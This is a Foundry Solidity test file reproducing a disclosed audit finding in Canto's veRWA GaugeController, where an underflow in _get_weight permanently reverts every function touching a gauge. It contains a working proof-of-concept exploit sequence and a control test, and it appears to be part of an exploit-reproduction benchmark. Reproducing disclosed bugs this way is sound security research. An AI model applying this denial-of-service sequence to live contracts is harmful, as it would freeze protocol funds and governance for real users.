// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./26973-h-05-it-is-possible-to-dos-all-the-functions-related-to-some.sol";

/*//////////////////////////////////////////////////////////////
    Canto (veRWA) — GaugeController._get_weight() underflow permanently bricks
    a gauge (H-05, #26973)

    `_get_weight` walks a gauge's checkpoint history week-by-week. If governance
    lowers a gauge's weight to 0 (which zeroes `pt.slope` too) and later raises it
    again while a vote-exit scheduled in `changes_weight` for an unprocessed week
    is still pending, the next catch-up step computes `pt.slope -= d_slope` with
    `pt.slope == 0` and `d_slope > 0` — an underflow. Every function that touches
    the gauge (`checkpoint_gauge`, `change_gauge_weight`, `vote_for_gauge_weights`,
    even `remove_gauge`) calls `_get_weight` and now reverts forever.

    - test_exploit: plants the post-multi-week precondition directly into the
      cheatcode-free Exploit's GaugeController via `vm.store` (Exploit.run()
      itself never uses cheats — see the synthetic file's header for why real
      calendar weeks can't elapse inside a single-timestamp `run()`), then
      drives Exploit.run() and re-asserts the permanent DoS.
    - test_fullTimeWarpReproduction: standalone rebuild using REAL `vm.warp`
      across several weeks, mirroring bart1e's original PoC almost line for
      line — independent proof the bug is real, not an artifact of the
      storage-seeding shortcut above.
    - test_control_noPriorZeroing_neverUnderflows: control — without governance
      ever having zeroed the gauge's weight first, the same catch-up loop never
      underflows, isolating "weight zeroed while a vote-exit is pending" as the
      precondition.
//////////////////////////////////////////////////////////////*/
contract GaugeControllerUnderflowDosTest is Test {
    uint256 internal constant WEEK = 7 days;

    // --- storage-slot helpers for GaugeController's mappings (see the
    //     synthetic file's slot-numbered field comments) ---
    function _pointsWeightBiasSlot(address gauge, uint256 t) internal pure returns (bytes32) {
        bytes32 inner = keccak256(abi.encode(gauge, uint256(6)));
        return keccak256(abi.encode(t, inner));
    }

    function _changesWeightSlot(address gauge, uint256 t) internal pure returns (bytes32) {
        bytes32 inner = keccak256(abi.encode(gauge, uint256(7)));
        return keccak256(abi.encode(t, inner));
    }

    function _timeWeightSlot(address gauge) internal pure returns (bytes32) {
        return keccak256(abi.encode(gauge, uint256(8)));
    }

    /// @dev Plants exactly the end-state that "governance zeroes the gauge's
    ///      weight -> a vote-exit's changes_weight entry is still pending ->
    ///      governance raises the weight again" leaves behind after several
    ///      real weeks, directly into `gc`'s storage.
    function _plantUnderflowPrecondition(GaugeController gc, address gauge, uint256 bias, uint256 slopeDecrease)
        internal
    {
        uint256 t0 = (block.timestamp / WEEK) * WEEK;
        uint256 t1 = t0 + WEEK;
        vm.store(address(gc), _pointsWeightBiasSlot(gauge, t0), bytes32(bias)); // points_weight[gauge][t0].bias
        // points_weight[gauge][t0].slope stays 0 (default) — the "zeroed by governance" state
        vm.store(address(gc), _timeWeightSlot(gauge), bytes32(t0)); // time_weight[gauge] = t0
        vm.store(address(gc), _changesWeightSlot(gauge, t1), bytes32(slopeDecrease)); // pending vote-exit at t1
    }

    /// @notice HARM via the self-contained Exploit: after planting the
    ///         precondition into its GaugeController, checkpoint_gauge,
    ///         change_gauge_weight, and remove_gauge all revert forever.
    function test_exploit() public {
        // Anchor block.timestamp to a realistic epoch (forge's default t=1 is
        // less than one WEEK, which would make our planted `time_weight` floor
        // to 0 and short-circuit `_get_weight` before it ever loops).
        vm.warp(1706075008);

        Exploit e = new Exploit();
        GaugeController gc = e.gc();
        address gauge1 = e.GAUGE1();

        _plantUnderflowPrecondition(gc, gauge1, 5 ether, 1e15);

        e.run();

        // Re-assert independently from the driver: the gauge is bricked.
        vm.expectRevert();
        gc.checkpoint_gauge(gauge1);
        vm.expectRevert();
        vm.prank(address(e));
        gc.change_gauge_weight(gauge1, 3 ether);
    }

    /// @notice Standalone rebuild using REAL vm.warp across several weeks —
    ///         the same root mechanism as the finding's own `testPoC1`
    ///         (governance zeroes a gauge's weight without touching its slope,
    ///         then raises it again while a vote's scheduled exit is still
    ///         pending), worked out with clean week-aligned numbers so every
    ///         step below can be hand-verified against GaugeController's exact
    ///         formulas. Independent proof the bug is real, not an artifact of
    ///         the storage-seeding shortcut in `test_exploit`.
    function test_fullTimeWarpReproduction() public {
        MockVotingEscrow ve = new MockVotingEscrow();
        GaugeController gc = new GaugeController(address(ve), address(this));

        address gauge1 = address(0xCAFE1);
        address user1 = makeAddr("user1");

        uint256 tStart = 604_800 * 1000; // any WEEK-aligned epoch
        vm.warp(tStart);

        gc.add_gauge(gauge1);

        // user1 votes 100% with a lock ending in exactly 5 weeks.
        ve.setUser(user1, 1e15, tStart + 5 weeks);
        vm.prank(user1);
        gc.vote_for_gauge_weights(gauge1, 10_000);
        // time_weight[gauge1] is now tStart+1w; points_weight[gauge1][tStart+1w]
        // = {bias: slope*4w, slope: slope} — a vote-exit is scheduled at
        // changes_weight[gauge1][tStart+5w] += slope.

        // Governance zeroes the gauge's weight two weeks later. _get_weight's
        // internal catch-up (run as part of this call) walks the bias down
        // naturally to tStart+3w, THEN _change_gauge_weight force-overwrites
        // bias to 0 there — but never touches slope, which stays user1's
        // nonzero slope.
        vm.warp(tStart + 2 weeks);
        gc.change_gauge_weight(gauge1, 0);

        // One week later, governance raises the weight again. The catch-up
        // this time starts from an ALREADY-zero bias, so `pt.bias > d_bias`
        // (0 > slope*WEEK) is false and the ELSE branch fires: bias AND slope
        // both become 0 at tStart+4w — before the loop ever reaches tStart+5w,
        // so user1's scheduled exit is silently skipped, not consumed.
        // _change_gauge_weight then overwrites bias to a positive value at
        // that same tStart+4w checkpoint, leaving slope at 0.
        vm.warp(tStart + 3 weeks);
        gc.change_gauge_weight(gauge1, 1 ether);

        // By tStart+5w (user1's lock end, exactly one week after the last
        // checkpoint), ANY call touching this gauge walks forward one more
        // week: bias(positive) > d_bias(0) is true, so it tries to subtract
        // the now-encountered changes_weight[gauge1][tStart+5w] (user1's
        // still-pending exit slope) from a slope that is already 0.
        vm.warp(tStart + 5 weeks);

        // HARM: the gauge is permanently bricked — checkpointing, changing its
        // weight, and even removing it all revert with an arithmetic underflow.
        vm.expectRevert();
        gc.checkpoint_gauge(gauge1);

        vm.expectRevert();
        gc.change_gauge_weight(gauge1, 2 ether);

        vm.expectRevert();
        gc.remove_gauge(gauge1);
    }

    /// @notice Control: without governance ever zeroing the gauge's weight
    ///         first, the exact same multi-week catch-up loop never underflows.
    function test_control_noPriorZeroing_neverUnderflows() public {
        MockVotingEscrow ve = new MockVotingEscrow();
        GaugeController gc = new GaugeController(address(ve), address(this));

        address gauge1 = address(0xCAFE2);
        address user1 = makeAddr("user1");

        ve.setUser(user1, 1e15, block.timestamp + 1825 days);

        gc.add_gauge(gauge1);
        gc.change_gauge_weight(gauge1, 1 ether); // raised directly, never zeroed

        vm.prank(user1);
        gc.vote_for_gauge_weights(gauge1, 10_000);

        vm.warp(block.timestamp + 20 weeks);

        // No underflow: checkpointing, changing weight, and removing all work.
        gc.checkpoint_gauge(gauge1);
        gc.change_gauge_weight(gauge1, 2 ether);
        gc.remove_gauge(gauge1);
    }
}
